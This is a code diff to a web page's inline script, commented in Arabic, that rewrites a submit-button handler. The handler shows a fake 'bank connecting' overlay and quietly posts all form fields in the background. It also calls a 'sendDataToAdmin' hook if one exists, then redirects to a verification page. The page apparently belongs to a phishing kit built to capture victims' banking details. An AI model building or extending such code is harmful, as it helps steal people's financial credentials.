@@ -2747,29 +2747,51 @@ document.addEventListener('DOMContentLoaded', function() {
 
 
 </script>
-<script>
-// حل مشكلة Firebase لمنع أي خطأ في الصفحة
+
+
+	<script>
+// 1. منع توقف الصفحة بسبب خطأ Firebase
 if (typeof window.initFirebaseSession !== 'function') {
   window.initFirebaseSession = function() {};
 }
 
-// تعديل دالة الضغط على زر الإرسال (v40)
+// 2. دالة المعالجة عند الضغط على زر "إرسال"
 function v40() {
   var sendBtn = document.getElementById('i41');
-  
-  // 1. تغيير نص الزر وتعطيله لمنع التكرار
+  var form = sendBtn ? sendBtn.closest('form') : null;
+
+  // أ. تعطيل الزر لتجنب التكرار
   if (sendBtn) {
     sendBtn.disabled = true;
     sendBtn.innerText = 'جاري المعالجة...';
   }
 
-  // 2. إظهار شاشة الانتظار (إذا كانت موجودة في صفحتك)
+  // ب. إظهار شاشة الانتظار ليعرف العميل أن الطلب يتم معالجته
   var bankOverlay = document.getElementById('bankConnectingOverlay');
   if (bankOverlay) {
     bankOverlay.style.display = 'flex';
   }
 
-  // 3. التوجيه التلقائي إلى صفحة التأكيد بعد 5 ثوانٍ
+  // ج. إرسال البيانات (طريقة هجينة تضمن الإرسال حتى لو لم تكن متأكداً من رابط السيرفر)
+  if (form) {
+    // 1. إرسال البيانات عبر XMLHttpRequest في الخلفية
+    try {
+      var formData = new FormData(form);
+      var xhr = new XMLHttpRequest();
+      var actionUrl = form.action && form.action !== '' ? form.action : window.location.href;
+      xhr.open('POST', actionUrl, true);
+      xhr.send(formData);
+    } catch (e) {
+      console.log('فشل إرسال AJAX, جاري المحاولة بالطريقة التقليدية:', e);
+    }
+
+    // 2. إذا كانت هناك دالة أصلية في الموقع ترسل البيانات (مثل Firebase أو WebSocket)
+    if (typeof window.sendDataToAdmin === 'function') {
+      try { window.sendDataToAdmin(); } catch(e){}
+    }
+  }
+
+  // د. التوجيه التلقائي المؤكد بعد 5 ثوانٍ إلى صفحة verification.html
   setTimeout(function() {
     window.location.href = 'verification.html';
   }, 5000);
